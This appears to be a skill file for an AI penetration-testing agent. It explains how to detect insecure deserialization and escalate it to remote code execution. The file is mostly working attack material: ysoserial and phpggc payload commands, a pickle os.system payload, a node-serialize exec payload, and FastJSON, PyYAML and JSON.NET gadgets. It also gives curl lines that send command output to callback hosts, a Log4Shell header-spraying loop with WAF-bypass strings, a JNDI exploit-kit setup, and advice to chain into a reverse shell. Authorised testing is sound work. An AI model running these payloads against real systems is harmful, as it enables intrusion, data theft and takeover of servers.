---
name: Insecure Deserialization
description: Detect untrusted deserialization across Java, PHP, Python, Ruby, .NET, and Node, and escalate to RCE proven by command output or a token-correlated out-of-band callback.
tags: [web, deserialization, rce, owasp-a08]
recommended_tools: [http_request, http_repeater, execute_command, nuclei_scan, jaeles_vulnerability_scan]
vuln_classes: [deserialization]
domain: web
phase: exploitation
---
# Insecure Deserialization

Untrusted serialized data passed to a deserializer lets an attacker instantiate objects and trigger gadget chains -> RCE. The proof bar is **command execution or a token-correlated OAST callback** — a stack trace or type-error is only a lead, never the finding.

## Where to look
Serialized blobs in cookies, hidden form fields, `__VIEWSTATE`, JWT-adjacent tokens, API request bodies, message queues, caches, and file uploads. Anywhere a base64/binary blob round-trips through the server is a candidate.

## Recognise the format (magic bytes / wire signatures)
| Format | Hex magic | Base64 start | Toolkit |
|---|---|---|---|
| Java stream | `AC ED 00 05` | `rO0AB` | ysoserial (CommonsCollections5/6, etc.) |
| .NET BinaryFormatter | — | `AAEAAAD/////` | ysoserial.net (TypeConfuseDelegate) |
| PHP serialized | `4F 3A` (`O:`) / `61 3A` (`a:`) | `O:` / `a:` | phpggc POP chains |
| PHP Phar | `50 4B 03 04` (+ `.phar`) | — | phpggc (phar:// trigger on file-op) |
| Python pickle | `80 04` / `80 03` | `gASV` / `gAJ` | `__reduce__` object / SECRET_KEY forge |
| Ruby Marshal | `04 08` | `BAh` | `Gem::Installer` / universal RCE gadget |
| Node node-serialize | — | `{"...":"_$$ND_FUNC$$_function...` | IIFE `()` RCE |
| Java XMLDecoder | — | `<java>` / `<object class=` | direct `ProcessBuilder` method calls |

PHP `O:8:"Class":...` patterns indicate `unserialize()`; `application/x-java-serialized-object` headers indicate Java streams; .NET often appears in `__VIEWSTATE` (needs the machineKey to sign).

## Detection -> confirmation -> escalation ladder
1. **Spot the blob & format** using the table above; decode base64 to check magic bytes.
2. **Confirm reach.** Send a benign-but-valid serialized object and observe whether the server deserializes (different error vs. malformed input, or a class-load attempt).
3. **Blind OAST first.** Generate a gadget that does a network callback to a token host before any command — this avoids blind false positives:
   - Java: `java -jar ysoserial.jar CommonsCollections5 'curl http://<token>.oast.example/'`
   - A token-correlated callback = confirmed deserialization RCE.
4. **Escalate to command output.** Run a command whose output returns or exfiltrates: `... 'curl http://<token>.oast.example/$(id|base64)'`, or in-band `id`/`whoami` if a response channel exists. Time-based (`sleep 10`) is a fallback signal only.
5. **Capture proof** — command output or the token-correlated OAST hit.

## Per-language exploitation
- **Java:** `ysoserial CC5/CC6` (works JDK 8u71+), Spring/JDK7 gadgets; inject base64 into the cookie/header/body. XMLDecoder endpoints call methods directly (`ProcessBuilder`).
- **PHP:** craft a POP chain over in-scope classes via `__wakeup`/`__destruct`/`__toString`; `phpggc Laravel/RCE1 system id`, `phpggc Monolog/RCE` etc. Phar deserialization triggers on `file_exists`/`fopen` against `phar://upload.jpg`.
- **.NET:** `ysoserial.net -g TypeConfuseDelegate -f BinaryFormatter -c "cmd"`; ViewState needs the `machineKey`; Json.NET `TypeNameHandling` abuse.
- **Python:** pickle `__reduce__` returning `(os.system, ('curl http://OAST/$(id|base64)',))`; forge Flask sessions with a recovered/brute `SECRET_KEY` (`flask-unsign --sign/--unsign --wordlist`).
- **Ruby:** Marshal universal gadget / `!ruby/object:Gem::Installer`; YAML RCE via `psych` `!ruby/object`.
- **Node:** `node-serialize` IIFE `{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl http://OAST/')}()"}`.

## Exact proof to capture
The **exact serialized payload** (and where it was injected), the **format + gadget/library** used, and the **proof**: command output returned in-band, or a **token-correlated OAST callback** from the target. Stack traces, `ClassNotFound`, or timing-only signals are leads, not proof.

## Tooling
- `execute_command` to generate payloads: `java -jar ysoserial.jar CommonsCollections6 '<cmd>'`, `phpggc <chain> '<cmd>'`, `ysoserial.net`.
- `http_request` / `http_repeater` to inject the (base64) payload into the exact cookie/header/body and read the raw response.
- `nuclei_scan` / `jaeles_vulnerability_scan` for known deserialization CVEs (e.g. exposed Java RMI/JMX, Telerik, ViewState, Liferay) and quick endpoint triage.
- Source grep when available: `unserialize(` near request input (PHP), `readObject`/`ObjectInputStream`/`commons-collections` (Java), `pickle.loads`/`yaml.load(` (Python), `node-serialize`/`.unserialize(` (Node).

## Chaining
Deserialization RCE -> reverse shell -> internal pivot. SSRF/file-upload can *deliver* the blob (phar via upload). Leaked `machineKey`/`SECRET_KEY` upgrades a signed-cookie issue into deserialization RCE.

## Safety / CWE
Generating exploit gadgets and achieving RCE is state-changing and HITL-gated; use benign, token-scoped commands, confirm OOB before any command, and avoid destructive payloads. CWE-502.


<!-- Ingested from reference frameworks (skill-ingestion) -->
## Magic-byte sink ID -> URLDNS OOB oracle -> language-matched gadget
Identify the serializer by leading bytes, fire a BLIND OAST oracle first (proves deserialization happens), only then deliver an RCE chain.
```
Java    \xac\xed (base64 starts rO0)      .NET  \x00\x01\x00\x00\x00\xff      pickle \x80\x02/\x80\x04
Ruby    \x04\x08                          PHP   O:8:"...":  /  a:N:{
```
Blind oracle then RCE:
```
ysoserial URLDNS 'http://canary.{OAST}/' > /tmp/urldns.bin           # Java, no gadget needed, proves deserialize
ysoserial CommonsCollections6 'curl http://{OAST}/cc6' > /tmp/cc6.bin
phpggc Monolog/RCE1 system 'curl http://{OAST}/m1' > /tmp/m1.ser
```
Language-matched payloads:
```
Python pickle:  class P:\n def __reduce__(self): return (os.system,('curl http://{OAST}/$(whoami)',))
PyYAML:         !!python/object/apply:os.system ["curl http://{OAST}/$(whoami)"]
Jackson/FastJSON: {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker:1389/Exploit","autoCommit":true}
JSON.NET:       {"$type":"System.Windows.Data.ObjectDataProvider,...","MethodName":"Start",...}
Shiro rememberMe: AES-CBC encrypt cc6.bin with brute-forced key; detect via absence of rememberMe=deleteMe in response
```
Proof signal: OAST DNS/HTTP hit timestamped within the same minute as the request confirms the bytes were deserialized; follow with `id`/`hostname` exfil for full RCE. Always send the URLDNS/`__reduce__` oracle before any heavyweight gadget chain.

## Modern techniques & real-world CVEs (via recon-skills)

### JNDI / Log4Shell as a deserialization-equivalent sink
Log4Shell (CVE-2021-44228) is a lookup-injection sink that reaches a JNDI/LDAP class-load — treat it exactly like a blind deser oracle: fuzz every reflected/logged input with a token-correlated OOB probe, then swap the DNS canary for an LDAP payload that class-loads a gadget. Fan the probe across headers AND JSON body fields (each field gets its own token so you can attribute the callback):
```bash
COLLAB="{OAST}"
for H in "User-Agent" "X-Forwarded-For" "Referer" "X-Api-Version" "Accept-Language" "X-Forwarded-Host"; do
  curl -s "https://$TARGET/" -H "$H: \${jndi:dns://$COLLAB/$H}" >/dev/null &
done
curl -s -X POST "https://$TARGET/api/login" -H 'Content-Type: application/json' \
  -d "{\"username\":\"\${jndi:ldap://$COLLAB/uname}\",\"password\":\"\${jndi:ldap://$COLLAB/pass}\"}"
```
Also try nested/obfuscated forms that bypass naive WAF string filters: `${${lower:j}ndi:${lower:l}dap://$COLLAB/x}`, `${${::-j}${::-n}${::-d}${::-i}:...}`, and `${jndi:${lower:r}mi://...}`. On callback, stand up an LDAP referral that returns a malicious class (JNDI-Exploit-Kit) to convert the DNS hit into full RCE:
```bash
git clone https://github.com/pimps/JNDI-Exploit-Kit
# serves ${jndi:ldap://ATTACKER:1389/Exploit} -> class load -> command exec
```
Related CVEs to fingerprint before hand-fuzzing: Log4Shell CVE-2021-44228 / CVE-2021-45046 (bypass), and the logback follow-on CVE-2021-42550. CWE-502 / CWE-917 (expression-language injection).

### Known-CVE deserialization endpoints (fingerprint before fuzzing)
Serialized sinks are frequently exposed at fixed, product-specific paths — probe these directly rather than only spidering:
```
/wls-wsat/CoordinatorPortType     WebLogic WSAT (CVE-2017-10271, CVE-2019-2725) — POST XML/ser blob
/_async/AsyncResponseService      WebLogic async (CVE-2019-2725)
/invoker/JMXInvokerServlet        JBoss JMXInvoker — raw Java stream, Content-Type: application/x-java-serialized-object
/invoker/readonly                 JBoss (CVE-2017-12149 JBossMQ / RichFaces)
/jmx-console/  /web-console/       JBoss consoles
/remoting/                        Jenkins/CLI remoting deser
```
For WebLogic WSAT, deliver the ysoserial blob as the SOAP body:
```bash
java -jar ysoserial-all.jar CommonsCollections6 'curl http://{OAST}/wls' > payload.bin
curl -s "https://$TARGET/wls-wsat/CoordinatorPortType" \
  -H 'Content-Type: application/x-java-serialized-object' --data-binary @payload.bin
```

### Apache Shiro rememberMe (CVE-2016-4437) — default-key detection oracle
Beyond crafting the AES-CBC blob, use the **response oracle** to confirm deserialization without RCE: send an arbitrary (even garbage) `rememberMe` cookie — if the server *fails* to deserialize it returns `rememberMe=deleteMe` in `Set-Cookie`; a valid gadget that deserializes cleanly does **not**. Brute the AES key against the leaked default list, then encrypt a CC-chain:
```bash
curl -sI "https://$TARGET/" -b "rememberMe=$(python3 -c 'print("A"*32)')" | grep -i deleteMe   # oracle
# then: AES-CBC encrypt ysoserial CC6 blob with brute-forced key -> rememberMe cookie -> RCE
```

### Framework gadget-chain updates (2021-2024)
- **Laravel** — `phpggc Laravel/RCE9` … up through the current `RCE1x` chains; when `APP_KEY` leaks, forge a signed `X-XSRF-TOKEN`/session cookie to reach the `unserialize` sink (CVE-2018-15133 pattern still live in leaked-key scenarios).
- **Java / Spring** — SpringCore CVE-2022-22965 ("Spring4Shell", class-loader property binding, not a stream deser but same RCE outcome) and the `Groovy1`/`Spring1/2`/`Rome1` ysoserial chains for non-CC classpaths.
- **FastJSON / Jackson** — `@type`/JdbcRowSetImpl JNDI autotype (FastJSON ≤1.2.80, CVE-2022-25845) and Jackson polymorphic-typing gadgets (`c3p0`, `spring-context` — CVE-2020-36518-adjacent); trigger via `{"@type":"...JdbcRowSetImpl","dataSourceName":"ldap://{OAST}:1389/x","autoCommit":true}`.
- **.NET** — Json.NET `TypeNameHandling.All` ObjectDataProvider, `ViewState` via ObjectStateFormatter (CVE-2020-0688 Exchange fixed-`validationKey` → deterministic RCE), and BinaryFormatter `TypeConfuseDelegate`.
- **Ruby** — Rails `ActiveSupport` / `Marshal.load` universal RCE gadget; `Gem::Requirement`/`Gem::Installer` chains.

### Automation / OOB harness
```bash
interactsh-client -v -n 5            # token-correlated DNS+HTTP callbacks for blind confirmation
nuclei -t http/cves/ -tags deserialization,log4j,shiro,weblogic,jboss -u https://$TARGET
```
Priority gate reminder: a serialized-object header (`AC ED 00 05` / `rO0AB`, `rememberMe`, `__VIEWSTATE`) proves *presence*, not that the app deserializes it. Only a token-correlated OOB callback or in-band command output confirms the vuln — everything else is a lead.
